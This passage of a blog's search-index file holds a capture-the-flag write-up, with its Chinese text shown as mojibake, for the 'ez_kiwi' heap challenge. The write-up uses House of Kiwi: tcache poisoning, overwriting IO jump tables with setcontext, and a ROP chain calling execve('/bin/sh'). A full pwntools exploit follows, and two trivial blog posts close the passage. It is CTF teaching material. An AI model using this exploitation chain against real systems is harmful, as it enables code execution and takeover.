id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h3><p>å…³äºIO_helper_jumpsçš„åœ°å€å¯»æ‰¾ï¼šç”±äºpwntoolsæ— æ³•ä»æ–‡ä»¶ç›´æ¥å¾—åˆ°IO_helper_jumpsçš„ä¿¡æ¯ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è¿™é“é¢˜æä¾›çš„libcæ–‡ä»¶åˆ©ç”¨idaä¸­æ‰¾åˆ°åç§»ï¼›ä½†å¦‚æœæ˜¯ä»pwndbgä¸­å¯»æ‰¾ï¼Œæ‰¾åˆ°çš„åœ°å€å¹¶ä¸æ˜¯<code>_IO_file_sync</code>ä¸­æ‰€åˆ©ç”¨çš„é‚£ä¸ªåœ°å€ï¼Œå¯¹æ¯”ä¸‹å›¾å’Œä¸Šå›¾å°±ä¼šå‘ç°éœ€è¦-0xc0æ‰æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„åœ°å€ã€‚</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> åˆ©ç”¨0x20å¤§å°çš„å †å—é‡å ï¼Œå¯ä»¥ä¿®æ”¹tcacheä¸­çš„fdæŒ‡é’ˆï¼Œå°±å¯å¯¹<code>IO_file_jumps</code>çš„åœ°å€ä¿®æ”¹ï¼Œå¹¶æ³„æ¼å †çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ROPgadget æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œåˆ©ç”¨ç³»ç»Ÿè°ƒç”¨å»æ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL) ï¼ˆå‚¨å­˜&#x2F;bin&#x2F;shçš„åœ°å€è‡ªå·±æ‰¾å¥½åç§»å³å¯ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>ç»§ç»­åˆ©ç”¨0x20å¤§å°çš„å †å—é‡å ï¼Œå»ä¿®æ”¹<code>_IO_helper_jumps + 0xa0 å’Œ _IO_helper_jumps + 0xa8</code>ä¸­çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>å…³äºè§¦å‘<code>__malloc_assert</code>ï¼šåœ¨top chunkä¸å¤Ÿä½¿ç”¨æ—¶å°±ä½¿ç”¨sysmallocï¼ŒåŒæ—¶å¯¹top chunkè¿›è¡Œä¸€ç³»åˆ—æ£€æŸ¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸æ˜¯ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œè€Œæ˜¯æ•…æ„è®©å…¶ä¸èƒ½é€šè¿‡æ£€æŸ¥ã€‚è¿™é‡Œæ”¹å˜top chunkçš„å¤§å°ï¼Œä½¿å…¶ä¸èƒ½é¡µå¯¹é½ï¼Œå¹¶ä½¿ç”¨gift()å‡½æ•°ç”³è¯·0x25000å¤§å°çš„å †å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p> å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/Hello-world/"/>
    <url>/2022/11/01/Hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">avatar:</span> <span class="hljs-string">&quot;https://xtxtn.github.io/img/my.jpg&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
